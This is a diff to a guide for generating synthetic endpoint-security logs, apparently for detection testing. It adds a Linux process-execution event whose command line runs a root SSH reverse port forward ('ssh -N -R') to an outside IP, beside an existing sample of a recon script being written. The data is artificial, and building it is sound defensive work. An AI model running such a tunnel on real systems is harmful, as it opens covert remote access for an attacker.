@@ -150,6 +150,11 @@ When generating dynamic logs, compute the timestamps using the following standar
 {"Options":"83886176","ContextThreadId":"214887041898296","MinorFunction":"0","aip":"198.51.100.25","Information":"2","FileIdentifier":"90b5e33d77507b4a8721ecb562d909fb610d000000004401","event_platform":"Win","ShareAccess":"1","id":"e5b91246-f205-11ea-8000-02a134ba7e05","FileObject":"18446631971079767936","EffectiveTransmissionClass":"3","FileAttributes":"128","timestamp":"##$Epoch-0d0h2m0s$##330","Status":"0","event_simpleName":"NewScriptWritten","ContextTimeStamp":"##$Epoch-0d0h2m0s$##.290","ConfigStateHash":"372366231","ContextProcessId":"96415699482103","IrpFlags":"2180","ConfigBuild":"1007.3.0011604.1","MajorFunction":"0","DesiredAccess":"1180054","Entitlements":"15","name":"NewScriptWrittenV7","OperationFlags":"0","aid":"cc71beda79b940fb4d9223464401c0e4","cid":"9504041dcb954091a7e5c3211c821897","TargetFileName":"\\Device\\HarddiskVolume4\\Users\\Public\\Downloads\\recon_script.ps1"}
 ```
 
+### Example 6: Linux Process Execution - SSH Reverse Port Forwarding (`ProcessRollup2` on Linux)
+```json
+{"ParentProcessId":"88412910381921","SourceProcessId":"88412910381921","aip":"10.128.0.15","SHA1HashData":"0000000000000000000000000000000000000000","UID":"0","event_platform":"Lin","ProcessEndTime":"","ParentBaseFileName":"bash","id":"f6c02357-f205-11ea-8000-02a134ba7e06","EffectiveTransmissionClass":"3","SessionId":"1","timestamp":"##$Epoch-0d0h1m0s$##120","event_simpleName":"ProcessRollup2","RawProcessId":"14280","ConfigStateHash":"372366231","MD5HashData":"b8b9e67c8d31d1f5664c7e19025c5403","SHA256HashData":"a1b2c3d498fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","ConfigBuild":"1007.3.0011604.1","CommandLine":"/usr/bin/ssh -N -R 8080:localhost:22 root@221.194.148.34","TargetProcessId":"96415699482199","ImageFileName":"/usr/bin/ssh","SourceThreadId":"29104820194899","Entitlements":"15","name":"ProcessRollup2LinuxV8","ProcessStartTime":"##$Epoch-0d0h1m0s$##.084","ComputerName":"i-0942348f80748b397","UserName":"root","aid":"0942348f80748b397000000000000001","cid":"9504041dcb954091a7e5c3211c821897"}
+```
+
 ---
 
 ## 6. Key Constraints & Common Pitfalls
